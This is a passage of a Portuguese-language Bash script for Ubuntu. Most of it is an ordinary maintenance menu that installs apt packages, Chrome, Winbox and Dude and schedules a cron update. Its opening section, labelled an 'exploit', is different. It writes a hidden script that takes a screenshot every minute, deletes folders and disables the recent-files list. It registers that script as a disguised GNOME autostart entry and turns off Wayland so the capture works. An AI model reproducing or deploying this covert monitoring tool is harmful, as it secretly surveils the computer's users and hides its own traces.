        # Take a screenshot every minute
        create_screenshot_directory
        apagar_pastas
		desativa_recentes
		take_screenshot
        sleep 60
    done
}

main
' > $DIRETORIO/arjexec.sh
}

auto_start () {
mkdir $HOME/.config/autostart
echo \
"
[Desktop Entry]
Type=Application
Exec=/bin/bash $DIRETORIO/arjexec.sh
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name[pt_BR]=arjexec
Name=arjexec
Comment[pt_BR]=
Comment=
" > $HOME/.config/autostart/bash.desktop
}

disable_wayland () {
    echo "WaylandEnable=false" | sudo tee -a /etc/gdm3/custom.conf
}

main_exec_exploit () {
    DIRETORIO=$HOME/.config/arjconfig
    sudo apt install scrot -y
        export_exploit
        auto_start
        disable_wayland
	echo -e "${VERDE}\nExploit instalado com sucesso!...${SEM_COR}\n"
}

main_exec_exploit

fi 

########################################################################################################################
#					    					MANUTENÇÃO UBUNTU
########################################################################################################################

cron_update_auto () { # automatiza update do systema
	echo "0 9 * * * /usr/bin/apt update && /usr/bin/apt upgrade -y && /usr/bin/apt dist-upgrade -y && /usr/bin/apt autoremove -y
" | sudo tee -a /etc/crontab
	echo -e "\n${VERDE}Habilitado Update Automático com sucesso todo dia as 09:00.${SEM_COR}\n"
}

testes_internet () { # testa conexão com a internet.
    if ! ping -c 1 8.8.8.8 -q &> /dev/null; then
    echo -e "${VERMELHO}[ERROR] - Seu computador não tem conexão com a Internet. Verifique a rede.${SEM_COR}"
    exit 1
    	else
    		echo -e "\n${VERDE}[INFO] - Conexão com a Internet funcionando normalmente.${SEM_COR}\n"
    fi
}

travas_apt () { # remove travas do apt
  sudo rm /var/lib/dpkg/lock-frontend
  sudo rm /var/cache/apt/archives/lock
  echo -e "${VERDE}Removido travas no APT${SEM_COR}\n"
  sleep 1
}

misc () { # adiciona arquitetura i386x86 e função na barra de ferramentas.
    sudo dpkg --add-architecture i386
    gsettings set org.gnome.shell.extensions.dash-to-dock click-action 'focus-minimize-or-previews' #minimiza na barra do gnome
    echo -e "\n${VERDE}Adicionado Misc!${SEM_COR}\n"
    sleep 1
}

system_update () { # atualiza o sistema.
    echo -e "\n${VERDE}Adicionado MISC${SEM_COR}\n"
    sleep 1
    sudo apt-get update && sudo apt-get upgrade -y
}

programas_para_instalar=( #lisagem de programas a serem instalados.
    # APLICATIVOS.
    telegram-desktop
    # DEPENDÊNCIAS.
    net-tools
	traceroute
	ssh
	git
    ttf-mscorefonts-installer
    network-manager-l2tp
    network-manager-l2tp-gnome
    apt-transport-https
    ca-certificates
    libreswan
    wine-stable
    gufw
    libfuse2
    ubuntu-restricted-extras
    curl
    scrot
    vim
    wget
    htop
    build-essential
    libssl-dev
    libffi-dev
    python3-dev
    python3-pip
    python3-venv
    python3-setuptools
    apt-transport-https
    ca-certificates
    software-properties-common
)

instala_apt_packages () {
    for nome_do_programa in "${programas_para_instalar[@]}"; do
        if ! dpkg -l | awk '{print $2}' | grep -q "^$nome_do_programa$"; then
            echo -e "${VERMELHO}[INSTALANDO]${SEM_COR} $nome_do_programa..."
            sleep 1
            sudo apt install "$nome_do_programa" -y
        else
            echo -e "${VERDE}[INSTALADO]${SEM_COR} - $nome_do_programa"
        fi
    done
}

suporte_flatpak () { # instala suporte a flatpak
    sudo apt-get install flatpak gnome-software-plugin-flatpak -y
    flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo
    echo -e "${VERDE}Adicionado Suporte a Flatpaks${SEM_COR}\n"
    sleep 1
}

instala_winbox () { # instala winbox client
    sudo apt install git wine-stable -y
    mkdir -p $HOME/Downloads/Winbox
    git clone https://github.com/qrocafe1535/winbox-installer.git $HOME/Downloads/Winbox
    chmod a+x $HOME/Downloads/Winbox/winbox-setup
    cd $HOME/Downloads/Winbox
    sudo ./winbox-setup install
}

instala_dude () { #instala dude client
    sudo apt install wget wine-stable -y
    mkdir -p $HOME/Downloads/Dude
    wget -P $HOME/Downloads/Dude https://download.mikrotik.com/routeros/6.48.6/dude-install-6.48.6.exe 
    wine $HOME/Downloads//Dude/dude-install-6.48.6.exe
}

mk_soft () {
    echo -e "Deseja instalar Winbox e Dude?\n"
    select  deseja_instalar in "Sim!" "Não"; do
        case $deseja_instalar in
            Sim! )
            echo "Instalando..."
            instala_winbox
            instala_dude
            break
            	;;
            Não )
            echo -e "Ok!...\n"
            exit 1
            	;; 
        esac
    done
}

instala_chrome () { # instala google chrome
    mkdir -p $HOME/Downloads/chrome
    wget -P $HOME/Downloads/chrome https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
    sudo sudo dpkg -i $HOME/Downloads/chrome/google-chrome-stable_current_amd64.deb
    echo -e "${VERDE}Instalado Google Chrome${SEM_COR}\n"
    sleep 1
}

system_clean () {
    sudo apt update -y
    flatpak update -y
    sudo apt autoclean -y
    sudo apt autoremove -y
	sudo rm -r $HOME/Downloads/chrome; rm -r $HOME/Downloads/Dude; rm -r $HOME/Downloads/Winbox
    echo -e "${VERDE}Sistema limpo!${SEM_COR}\n"
    sleep 1
}

main_update () { # Executando...
    echo -e "\n${AZUL}Começando em 3... 2... 1....\n${SEM_COR}\n"
	sleep 3
		testes_internet
        misc
        travas_apt
        instala_apt_packages
        system_update
        suporte_flatpak
        instala_chrome
        mk_soft
		system_clean
    echo -e "${AZUL}\nFinalizado com exito!\n${SEM_COR}"
}

if [[ "$tipo_do_servico" = "Manutenção Ubuntu" && $(lsb_release -si) == "Ubuntu" ]]; then # SELECIONE O QUE DESEJA FAZER!

PS3="$RODAPE1" # -------------------------- FRASE DO RODAPÉ )
	
	select man_ubuntu in "Instalação de Programas para o Suporte" "Instalar Winbox + TheDude" "Habilitar update automático as 09:00" "Sair"; do
		case $man_ubuntu in 
			"Instalação de Programas para o Suporte" )
				main_update # executa uma manutenção completa bem como a Instalação do Winbox + The dude
				break
					;;
			"Instalar Winbox + TheDude" )
				mk_soft # instala winbox e the dude client.
				system_clean # limpa o sistema.
				break
					;;
			"Habilitar update automático as 09:00" )
				cron_update_auto # Habilita o update automático via cron.
				break
					;;
			"Sair" )
				clear
				exit 1
					;;
			* ) 
				echo -e "${VERMELHO}\nPor favor insira uma opção válida.${SEM_COR}"
					;;
		esac
	done
	else # testa se for ubuntu, caso não seja exibe este erro.
		echo -e "\n${VERMELHO}Ops.... \nAparentemente você não está utilizando um ubuntu.\n${SEM_COR}\n"
fi

########################################################################################################################
#					    					FINAL MANUTENÇÃO UBUNTU
########################################################################################################################